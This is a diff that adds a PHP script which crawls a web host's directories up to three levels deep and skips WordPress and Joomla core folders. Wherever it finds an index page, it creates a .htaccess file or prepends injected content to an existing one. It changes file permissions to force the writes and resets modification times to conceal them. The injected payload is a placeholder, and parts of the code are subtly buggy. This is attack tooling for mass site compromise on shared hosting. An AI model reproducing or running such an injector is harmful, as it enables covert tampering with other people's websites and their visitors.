@@ -1,0 +1,218 @@
+$content=<<<CODE
+#test
+CODE;
+
+$str=array(0,'test');
+
+
+
+//API
+$wp = array('wp-admin','wp-content','wp-includes');
+$jm = array('administrator','cache','components','images','includes','language','libraries','logs','modules','plugins','templates','tmp','xmlrpc');
+$exc = array_merge($wp,$jm);
+
+
+//Vars
+$dir = path_finder();
+$what = array('.htaccess');
+$signature = array('index.php','index.html','index.htm'.'index.phtml','index.shtml');
+
+#Function Path_Finder
+function path_finder(){
+    $p=$_SERVER['SCRIPT_FILENAME'];
+	if(empty($p)){
+	   exit('Cant find the path');
+	   }
+	else{
+	   $p=str_replace('\/', '/', $p);
+	   $p=trim($p, '/');
+	   $p=substr_count($p, '/')-1;
+       }
+
+    for($k=1; $k<=$p; $k++){
+        if(!is_readable(str_repeat('../', $k))){
+        $pth=trim(str_repeat('../', $k-1));
+        break;
+        }
+	
+    }
+ 
+    if($pth){
+       return $pth;
+       }
+    else{
+       return trim(str_repeat('../', $p-1));
+       }
+ 
+ 
+    }
+
+
+#Function Edit
+function edit($path,$content,$str){
+    $lastmod=filemtime($path);
+
+    $strnum=file($path);
+    if(!stristr($strnum[$str[0]],$str[1])){
+	
+       if(file_put_contents($path,$content."\n".file_get_contents($path))){
+          echo 'Successfully writed the code into >>'.$path.'<br>';
+          }
+	   else{
+          echo 'Sorry,something is bad >>'.$path.'<br>';
+          }
+
+       //Touch
+       touch($path,$lastmod);
+       }
+    else{
+       echo 'Our code already here >>'.$path.'<br>';
+       }
+    }
+
+#Function Smartscan
+function smartscan($dir){
+    if(function_exists("scandir")){
+       return scandir($dir);
+       } 
+	else{
+       $dh  = opendir($dir);
+       while(false !== ($filename = readdir($dh)))
+           $files[] = $filename;
+           return $files;
+       }
+    }
+
+function search($dir,$content,$str,$what,$signature,$exc){
+$d=array();
+$d1=array();
+$d2=array();
+$res=smartscan($dir);
+
+if(count(array_intersect($res,$signature)) > 0 && !in_array($what[0],$res)){
+   if(file_put_contents($dir.'/'.$what[0],$content)){
+      chmod($dir.'/'.$what[0], 0644);
+	  echo 'Created .htacces in >>'.$dir.'/'.$what[0].'<br>';
+      }
+   else{
+      echo 'Cant create .htacces in >>'.$dir.'/'.$what[0].'<br>';
+      }
+   }
+
+//add dirs to massive 1
+foreach($res as $v){
+    if(is_dir($dir.'/'.$v) && $v!=="." && $v!==".."){
+       $d[]=$dir.'/'.$v;
+       }
+    }
+   
+//scan 1-deep files
+foreach($d as $n){
+$res2=smartscan($n);
+//Выпарсить из ../..//domains последнюю папку domains и проверить в исключениях она или нет
+$compare = explode('/',$n);
+$compare = $compare[count($compare)-1];//отпарсили domains
+
+if(count(array_intersect($res2,$signature)) > 0 && !in_array($what[0],$res2) && !in_array($compare,$exc)){
+   if(file_put_contents($n.'/'.$what,$content)){
+      chmod($n.'/'.$what[0], 0644);
+	  echo 'Created .htacces in >>'.$n.'/'.$what[0].'<br>';
+      }
+   else{
+      echo 'Cant create .htacces in >>'.$n.'/'.$what[0].'<br>';
+      }
+   }
+
+foreach($res2 as $l){
+if(is_dir($n.'/'.$l) && $l!=='.' && $l!=='..'){
+//add dirs to massive 2
+$d1[]=$n.'/'.$l;
+}
+
+
+if(preg_match('#'.implode('|',$what).'#i',$l)){
+chmod($n.'/'.$l, 0666);
+if(is_writable($n.'/'.$l)){
+edit($n.'/'.$l,$content,$str);
+chmod($n.'/'.$l, 0644);
+}else{
+echo 'Cant edit >>'.$n.'/'.$l.'<br>';
+}
+}
+}
+}
+
+//scan 2-deep files
+foreach($d1 as $n1){
+$res2=smartscan($n1);
+$compare = explode('/',$n1);
+$compare = $compare[count($compare)-1];
+
+if(count(array_intersect($res2,$signature)) > 0 && !in_array($what[0],$res2) && !in_array($compare,$exc)){
+   if(file_put_contents($n1.'/'.$what[0],$content) ){
+      chmod($n1.'/'.$what[0], 0644);
+	  echo 'Created .htacces in >>'.$n1.'/'.$what[0].'<br>';
+      }
+   else{
+      echo 'Cant create .htacces in >>'.$n1.'/'.$what[0].'<br>';
+      }
+   }
+   
+foreach($res2 as $l1){
+
+if(is_dir($n1.'/'.$l1) && $l1!=='.' && $l1!=='..'){
+//add dirs to massive 3
+$d2[]=$n1.'/'.$l1;
+}
+
+if(preg_match('#'.implode('|',$what).'#i',$l1)){
+chmod($n1.'/'.$l1, 0666);
+if(is_writable($n1.'/'.$l1)){
+edit($n1.'/'.$l1,$content,$str);
+chmod($n1.'/'.$l1, 0644);
+}else{
+echo 'Cant edit >>'.$n1.'/'.$l1.'<br>';
+}
+}
+}
+}
+
+//scan 3-deep files
+foreach($d2 as $n2){
+$res3=smartscan($n2);
+$compare = explode('/',$n2);
+$compare = $compare[count($compare)-1];
+
+if(count(array_intersect($res3,$signature)) > 0 && !in_array($what[0],$res3) && !in_array($compare,$exc)){
+   if(file_put_contents($n2.'/'.$what[0],$content) ){
+      chmod($n2.'/'.$what[0], 0644);
+	  echo 'Created .htacces in >>'.$n2.'/'.$what[0].'<br>';
+      }
+   else{
+      echo 'Cant create .htacces in >>'.$n2.'/'.$what[0].'<br>';
+      }
+   }
+
+foreach($res3 as $l2){
+
+
+if(preg_match('#'.implode('|',$what).'#i',$l2)){
+chmod($n2.'/'.$l2, 0666);
+if(is_writable($n2.'/'.$l2)){
+edit($n2.'/'.$l2,$content,$str);
+chmod($n2.'/'.$l2, 0644);
+}else{
+echo 'Cant edit >>'.$n2.'/'.$l2.'<br>';
+}
+}    
+
+}
+ }
+
+
+
+}
+
+
+#Exec Script
+search($dir,$content,$str,$what,$signature,$exc);
